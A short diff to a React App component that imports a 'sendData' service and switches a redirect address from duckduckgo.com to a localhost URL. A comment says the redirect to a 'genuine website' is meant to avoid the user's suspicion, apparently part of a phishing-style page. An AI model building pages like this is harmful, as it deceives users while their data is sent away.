@@ -9,7 +9,7 @@ import { sendData } from '../services/ApiServices';
 function App() {
 
   // The genuine website address to redirect the user (avoids suspicions) :
-  const redirectUrl = 'https://duckduckgo.com/';  
+  const redirectUrl = 'http://localhost:4400/';  
 
   // Website button click event :
   const handleClick2 = () => {
